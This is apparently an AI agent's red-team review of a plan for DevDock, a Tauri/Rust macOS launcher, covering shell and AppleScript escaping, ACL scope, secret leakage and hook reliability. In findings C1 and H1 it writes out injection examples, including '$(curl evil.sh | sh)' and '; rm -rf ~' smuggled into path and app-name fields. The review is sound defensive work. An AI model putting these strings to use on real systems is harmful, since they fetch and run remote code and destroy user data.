# Red-Team Security Adversary — Plan Review

**Target:** DevDock (greenfield macOS launcher, Tauri v2 + Rust + React 19)
**Reviewer posture:** hostile, assume the planner was careless
**Scope:** `plan.md`, `phase-01`…`phase-07`, two research reports
**Threat model applied:** local, single-user tool that *intentionally* runs the user's own commands. "Runs user commands" is the feature, not a bug. Findings below are the cases where **input the user did not intend as code** (a path, an app name, an env value, a URL) can cross into a shell/AppleScript context, or where a **secret leaks** to a sink the user did not expect. These are real even in a single-user tool: config can be imported, duplicated, pasted from a teammate, or synced later; a malicious `cwd`/env in a shared workspace file executes on *your* machine at launch.

Verdict: the security *intent* is right (Rust-owns-launch, single escaping boundary, default-deny ACL, lazy TCC). The security *design* has one genuinely dangerous gap (double-layer escaping is described as two separate functions but never composed), several overstated guarantees (the ACL claim), and three unescaped user-input fields the plan's escaping section never names (app/IDE/browser names). Fixable at the plan level — but not as written.

---

## CRITICAL

### C1 — Terminal launch crosses TWO interpreters; the plan treats escaping as one step
- **Summary:** `cd <cwd> && <command>` is composed into an AppleScript string run via `osascript`, but `do script`/`write text` then hand that string to `/bin/sh`. Input is parsed twice (AppleScript literal → shell). The plan lists `applescript_string()` and `shell_quote()` as *separate* functions and never states the terminal path composes both, in the right order.
- **Evidence:** `phase-03-launch-engine.md:32` (`escape.rs`: "shell-quote all arguments, and escape embedded quotes before composing any `osascript` string"), `:51` (`cd <escaped_cwd> && <escaped_command>`), `:67` (success criterion tests only `"; rm -rf ~"` breaking out of *quoting*). Research report `researcher-...-launch-automation-report.md:200-212` explicitly warns "single-quote wrapping does NOT protect AppleScript strings" and then shows an escape that only handles `"` → `\"` — i.e. the AppleScript-literal layer, **not** the shell layer inside `do script`.
- **Why it bites:** A `cwd` of `$(curl evil.sh | sh)` or `` `id` `` survives `applescript_string()` (no double-quotes to escape) and is then evaluated by the shell that `do script` feeds. Command substitution, `;`, `|`, `&&`, and backticks in `cwd`/env never touch a double-quote, so a quote-only escape is a no-op against them. `"; rm -rf ~"` is the *only* class the success criterion tests, and it's the least likely to appear in a real path. The dangerous classes (`$()`, backticks) are untested and unhandled by the described escape.
- **Suggested fix:** Specify the terminal path exactly: (1) shell-quote `cwd` with single-quotes and `'\''`-escape embedded single quotes (POSIX), producing a shell token; (2) wrap the *whole* composed shell line (`cd '<q-cwd>' && <command>`) as an AppleScript string literal, escaping `\` first then `"` and stripping/rejecting newlines and `\r`; (3) write a test matrix that asserts `cwd`/env values containing `` ` ``, `$(...)`, `;`, `|`, `&`, `\`, newline, and `"` cannot execute a side-effect. Make the ordering (shell-quote inner, then AppleScript-escape outer) an explicit, tested contract in `escape.rs`, not an implementation detail. Note that `command` itself is intentionally raw shell and must not be shell-quoted — call that out so no one "fixes" it into breakage.

### C2 — Whitelisting `osascript` in the ACL grants arbitrary code execution; the plan sells this as a security boundary
- **Summary:** The plan repeatedly credits the "fine-grained shell ACL" as a defense. But `osascript -e <script>` with any script can `do shell script "<anything>"`. Once `osascript` is on the allow-list, the ACL imposes zero constraint on what actually runs. The ACL is real for `open`/`which`/`test`/`docker` but is **security theater** for the one command that matters most.
- **Evidence:** `phase-03-launch-engine.md:34` ("fine-grained shell scope whitelisting `open`, `osascript`, `which`, `test`, `docker`"), `:69` ("No shell command executes without a matching fine-grained ACL entry"), `plan.md:36` ("never an unrestricted `sh -c`"). Research report `...-launch-automation-report.md:38-63` shows the ACL model matches command **name** + a regex on args (`{"validator": "\\S+"}`) — it cannot inspect AppleScript semantics. `plan.md:35` correctly says escaping is centralized, but then the ACL is repeatedly co-credited as if it narrows execution.
- **Why it bites:** A reader (or a future contributor) trusts the ACL to contain damage and relaxes `escape.rs` review "because the ACL scopes it." It doesn't. The ACL for `osascript` is equivalent to `shell:allow-execute` on `sh -c` in blast radius — the exact thing `plan.md:36` claims to avoid. The *only* real boundary on the terminal path is C1's escaping. Overstating the ACL creates false defense-in-depth.
- **Suggested fix:** Rewrite the ACL claim to be honest: `open`/`which`/`test`/`docker` are argument-scoped; `osascript` is **not meaningfully constrainable** and its safety rests entirely on `escape.rs`. State that `escape.rs` is the sole boundary for the AppleScript path and must be reviewed as such (tests-first is already planned — keep it, and make it the gating control, not the ACL). Do not claim "no command runs without ACL" as if it bounds behavior; it bounds only *which binary*, not *what it does*. Consider dropping the `docker`/`which`/`test` shell calls in favor of Rust-native checks (`std::path::Path::exists`, `PATH` walk) to shrink the shell surface to just `open` + `osascript`.

---

## HIGH

### H1 — App / IDE / browser **name** fields reach `open -a` and `test -d` and are never listed as escaping inputs
- **Summary:** The plan's escaping story is about *paths, commands, hooks, env values*. But `open -a "<App>"`, `open -a "<Browser>" <url>`, and detection's `test -d /Applications/<App>.app` all interpolate a **user-controlled name** (Phase 4 explicitly allows a custom app entry). These fields are absent from every escaping description.
- **Evidence:** `phase-03-launch-engine.md:28-31` (`open -a "<App>"`, `open -a "<Browser>" <url>`, `test -d /Applications/<App>.app`), `phase-04-workspace-configuration-ui.md:47` ("allow a custom app entry"), `:26` (`detect_tools` called **on mount** — so this fires automatically, before any explicit launch). `escape.rs` responsibilities (`phase-03:32`) name only paths/args, never app/browser names.
- **Why it bites:** If detection composes `test -d /Applications/<name>.app` as a shell string, a custom app name of `x.app; rm -rf ~; echo ` injects at **form-open / mount time**, not launch time — the user never clicked "launch." If names are passed as separate argv (via `Command::new("test").arg(...)`) it's safe; if they're composed into a string (as `cd && cmd` is), it's not. The plan doesn't say which, and the terminal path proves the author is willing to compose strings.
- **Suggested fix:** Mandate argv-array invocation (never string composition) for `open`/`test`/`which` — `Command::new("open").args(["-a", name, url])` — so names/URLs are never parsed by a shell. Add app/IDE/browser **name** and browser **URL** to `escape.rs`'s explicit input list. Validate the custom app name against a conservative allowlist (`^[A-Za-z0-9 ._-]+$`, reject `/`, `..`, control chars) and the URL against an `http(s)`-only scheme check to block `open`ing `file://`, `x-apple.systempreferences:`, or arbitrary URL-handler schemes.

### H2 — Env-var secrets leak beyond the one sink the plan guards (`export KEY="val"` is world-readable to the child; DEBUG logging of the composed script)
- **Summary:** Phase 6 says "log keys only, never values" — but only names `hooks.rs`/logs. The same secret env values are (a) injected as `export KEY="val"; ` into an interactive terminal (persisted in shell history + visible in the launched process's environment to anything the user runs), and (b) embedded in the composed AppleScript string assembled in `terminal.rs`, a *different* code path that `tracing` at DEBUG could log verbatim.
- **Evidence:** `phase-06-hooks-and-environment-variables.md:24` (`prepend export KEY="<escaped>";`), `:43` ("never log values (log keys only)"), `:61` ("log keys only, never values"). But the composed script lives in `phase-03:51` / `phase-06:31` (`terminal.rs` env injection) and `phase-01-foundation-and-scaffold.md:51` initializes `tracing_subscriber` globally with no field-redaction policy. Session metadata is written on completion (`phase-03:55`) with no stated exclusion of env.
- **Why it bites:** The "never log values" rule is scoped to hook execution, but the terminal composition path handles the identical secrets and is not covered. A single `tracing::debug!("script: {script}")` in `terminal.rs` (natural during dev) dumps every secret to the log file. Separately, `export KEY="secret"` in an interactive shell writes the secret to `~/.*_history` and exposes it in `/proc`-equivalent (`ps eww`) to any local process — surprising for a value the UI offered to "mask."
- **Suggested fix:** (1) Make redaction a *type-level* invariant, not a per-call discipline: wrap secret env values in a `Secret(String)` newtype whose `Debug`/`Display` prints `***`, so no `tracing` call can leak them regardless of which module composes the string. (2) Prefer passing env via the process environment (`Command::envs`) over `export` in the shell line wherever the launcher spawns directly, to keep values out of shell history; document that the AppleScript terminal path cannot avoid `export` and therefore terminal env vars are not a secrets-grade mechanism. (3) Explicitly exclude `env_vars` from session metadata and any future diagnostic/crash export — state it in Phase 3's session-metadata step, not only Phase 6.

### H3 — `validate_path()` allowlist is unspecified and cannot be both safe and correct as a character regex
- **Summary:** The security boundary hinges on `validate_path()`, but the plan never defines its policy. The research report's suggested regex (`^[a-zA-Z0-9/_\-\.]+$`) rejects the majority of real macOS project paths (spaces, unicode, `@`, parens, `+`), so it will either be loosened until unsafe or make the app unusable.
- **Evidence:** `phase-03-launch-engine.md:32` ("Validate paths against an allowlist pattern") — no pattern given. Research `...-launch-automation-report.md:502` proposes `/^[a-zA-Z0-9/_\-\.]+$/`. Real paths: `~/Projects/My App (v2)`, `~/Développement`, `~/work+play`. `phase-03:51` also resolves relative `cwd` against workspace `path` and expands `~` — expansion order vs. validation order is unspecified (validate before or after `~`/relative resolution?).
- **Why it bites:** A char-allowlist strict enough to be injection-safe blocks legitimate paths → users route around it or the author relaxes it to include space/`$`/`(` → injection surface reopens. And if validation runs *before* `~`/relative expansion, a value like `$HOME` or `..` may pass validation then expand into something unintended; if *after*, the expanded string must be re-validated. Neither order is specified.
- **Suggested fix:** Stop trying to make `validate_path` a character firewall. Instead: (1) resolve/expand first (`~`, relative-to-workspace) via `shellexpand` + `Path` canonicalization; (2) assert the result is an existing directory (`Path::is_dir`) at launch — a non-existent/traversal path fails cleanly; (3) pass the resolved path as a **shell-quoted single token** (per C1), which makes the character content irrelevant to safety. Reserve rejection for control characters and newlines only. Document the expand→canonicalize→quote order as the contract.

---

## MEDIUM

### M1 — `before_close` hooks have no guaranteed execution window and can be silently skipped or block quit
- **Summary:** `before_close` hooks are registered on window/app close (`docker compose down` etc.), but macOS app termination, force-quit, and crash give no reliable synchronous window to run an external command, and a slow hook either blocks quit (bad UX) or is abandoned (silent no-op).
- **Evidence:** `phase-06-hooks-and-environment-variables.md:25,33,44,53` (before-close registered on `lib.rs` window-close handler, runs commands like `docker compose down`). No timeout/abandonment policy stated for the close path specifically (the per-hook timeout in `:23` is described for launch hooks).
- **Why it bites:** User expects `docker compose down` on close; on force-quit or logout it never runs, leaving containers up — the exact failure the hook was meant to prevent, now with false confidence. Conversely, honoring the timeout on the close path can hang the quit for the timeout duration.
- **Suggested fix:** Document `before_close` as best-effort only (runs on graceful in-app "close workspace"/app-quit, not on force-quit/crash/logout). Apply a short, non-negotiable timeout on the close path and detach long teardown (spawn and don't await) so quit isn't blocked. Do not imply guaranteed teardown in the UI.

### M2 — Lazy TCC handling can't distinguish "denied" from "AppleScript error," risking a misleading prompt loop
- **Summary:** The plan catches `osascript` errors and shows "grant Automation in System Settings." But `osascript` failures conflate TCC denial, a syntax error in the composed script, a missing terminal app, and a runtime AppleScript error — all surfaced as the same "grant permission" guidance.
- **Evidence:** `phase-03-launch-engine.md:54` ("catch permission-denied errors and emit a `failed` step with a 'grant Automation' message"), `:68` ("a denied grant produces an actionable error"). No mechanism given to *distinguish* TCC denial (osascript exit + specific stderr / errAEEventNotPermitted -1743) from generic failure.
- **Why it bites:** If C1's escaping ever produces a malformed script, the user is told to grant Automation, grants it, and it still fails — eroding trust and masking the real (injection-adjacent) bug. Misclassification also hides script-composition regressions behind a permissions story.
- **Suggested fix:** Match on the specific TCC signal (AppleScript error `-1743` / `errAEEventNotPermitted`, or the known stderr substring) before showing the Automation guidance; treat other `osascript` non-zero exits as a distinct "terminal automation failed" error with the stderr surfaced (redacted of env values per H2). This also gives an early-warning signal that escaping is broken rather than burying it.

---

## Correctly scoped / not a finding (stated to avoid inventing issues)
- **Rust-owns-launch to contain TCC to one process** (`plan.md:35`, research `...-report.md:531`) is the right call and genuinely reduces the Automation-grant surface. Sound.
- **Warp = launch-only, no marker-file rc hack** (`plan.md:37`, declining research's env-marker workaround at `...-launch-automation-report.md:172,434`): correctly avoids writing to the user's shell rc. Good restraint.
- **Workspace names / tags rendered in React** are auto-escaped by JSX; no `dangerouslySetInnerHTML` is planned. The research report's dev-server CSP with `'unsafe-inline'`/`'unsafe-eval'` (`...-scaffold-report.md:137`) is dev-only and the app renders no remote content — not a runtime XSS concern for v1. No action needed beyond not copying that CSP into the production `tauri.conf.json`.
- **JSON-file storage, no SQLite, MVP scope**: locked user decisions; no security reason to reopen. Atomic write + skip-corrupt (`phase-02:19,24`) is appropriate.

---

## Top fixes, in order
1. **C1** — specify and test the two-layer (shell-quote → AppleScript-escape) terminal escaping; test `$()`/backticks/`;`/`\`/newline, not just `"; rm`.
2. **C2** — stop crediting the ACL for the `osascript` path; name `escape.rs` as the sole boundary; consider replacing `which`/`test`/`docker` shell calls with Rust-native checks.
3. **H1** — argv-array (never string-composed) invocation for `open`/`test`; validate custom app names + restrict URL schemes to http(s).
4. **H3** — replace char-allowlist path validation with expand → canonicalize → `is_dir` → shell-quote; define ordering vs `~`/relative resolution.
5. **H2** — `Secret` newtype for env values (leak-proof by type); exclude env from session metadata + diagnostics; note terminal `export` is not secrets-grade.
6. **M1 / M2** — best-effort + timeout for `before_close`; distinguish TCC-denied from generic osascript failure.

## Unresolved questions for the planner
- Does `escape.rs` compose `shell_quote` **inside** `applescript_string` for the terminal path, or are they applied independently? (C1 hinges on this and the plan is silent.)
- Are `open`/`test`/`which` invoked as argv arrays or composed strings? (H1 hinges on this.)
- Is `validate_path` applied before or after `~`/relative-`cwd` expansion? (H3.)

---
Status: DONE_WITH_CONCERNS
Summary: Security intent is correct, but the terminal path's two-layer escaping is described as two uncomposed functions (Critical), the ACL is oversold as a boundary it cannot enforce for `osascript` (Critical), and three user-controlled fields (app/browser names, URLs) plus env-secret sinks fall outside the plan's stated escaping/redaction scope.
Findings: 2 critical, 3 high, 2 medium
Report: /Users/quoc/Workspace/quocnguyen2001/devdocks/plans/reports/from-code-reviewer-to-planner-red-team-security-adversary-plan-review-report.md
